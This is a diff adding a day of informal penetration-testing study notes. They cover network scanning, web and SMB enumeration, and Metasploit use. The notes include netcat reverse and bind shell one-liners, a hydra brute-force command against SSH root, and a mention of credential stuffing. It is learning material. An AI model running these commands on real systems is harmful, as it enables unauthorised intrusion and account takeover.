@@ -30,3 +30,73 @@ u can navigate to packets, mark/colour/comment them, export certain objects/pack
 certain files and analyze them! :)
 Solved overpass2 a room in thm..i had to analyse tcp streams in wireshark and find the payload and take advantage of it
 to crack passwords and login back secure the system.
+
+Day 11:
+PEH contd..
+ping 8.8.8.8 ..if its old n ipconfig isnt there, ping from will be shown na, that is onli ip address
+arp-scan -l :netdiscovery..ull find ur own ip address n vmware
+netdiscover -r 192.168.231.0/24  ..sweeps all ip addresses across network
+nmap -T4 -p- -A <ip address> -v
+-sU scan top 1000 coz udp takes v long time for scan
+-sS stealth scan
+-sV version or service scan
+ 
+ web enumeration:
+ nikto -h https://ip address .. read result to see possible vulnerabilities like code execution, remote shell etc
+ directory busting using dirb or gobuster
+ dirb&
+ use wordlists
+ right click n view pg source codes like comments or passwd or users info retrieval
+ use burpsuite ..modify post requests ..look at server header
+ use wappalyzer installed..
+ 
+ enumerating smb:it is like a file sharing llike google drive where all can upload  or see files
+ metasploit: exploitation framework, auxilaary modules, info gathering, port scanning
+ type mfsconsole in terminal
+ in that: type:
+ search smb
+ use 60 or use auxillary/scanner/smb/smb_version
+ info, options
+ RHOST:remote host/victim/target ..in plural => can sweep a range
+ set RHOSTS <ip>
+ run
+ note down all os versions n all in notepad its important
+ smbclient -L \\\\\<ip>\\  ..-L to list files smbclient to connect to file share with anonymous access
+ ADMIN$ and IPC$ ..admin file is valuable
+ exit
+ 
+ ssh <ip> ....offers something output..copy that
+ ssh <ip> -oKexAlgorithms=+pastethat 
+ gives cipher
+ ssh <ip> -oKexAlgorithms=+pastethat -c pastecipher
+ yes for fingerprinting
+ 
+ based on what all u wrote down n versions n all, do research to find any vulnerabilities like cve for databases, openluck etc
+ like on which port, which type of vulnerability like sqli, overflow etc
+ searchsploit Samba 2.2.la //pput in terminal searchsploit is a tool
+ 
+ vulnerabilty scanning using nessus:
+ download nessus
+ learn this par later properly
+ 
+ 
+ Exploitation!!!! lezzgoooo
+ shell:accesss to a machine
+ revrse shell: victim connects to us
+ target: nc <ip> 4444 -e /bin/sh  executes a bin shell ..linux in windows means .exe
+ attackbox: nc -lvp 4444 ..listener is on prot 4444 verbose mode
+ 
+ in bind shell: open up a port on machine by firing a port ..it listens to connect.. and build a shell
+ attckbox: nc <ip>
+ target: nc -lvp 4444 -e /bin/sh
+ tcp connection on port 4444
+ 
+ payload: when u run an exploit its called payload it can be windows,linux,python diff types 
+ sent to victim, to attempt to get a shell on a machine
+ non staged payload:large, sends exploit shell code all at once, wont work always like meterpreter_reverse_tcp
+ staged:sends payload in stages, less stable extra / like meterpreter/reverse_tcp
+ 
+ brute force attcks: hydra -l root -P /usr/share/wordlists/metasploit/filename.txt ssh ://192.120185.24:22 -t 4 -V ...4 threads port22, verbose mode, root username
+ or u can search in metasploit: ssh,ssh_login,options,set pass_file /path , set rhosts <ip> , options to see all set, set threads 10, set verbose true, run
+
+credential stuffing:injecting breached account credentials in hope of account takeover
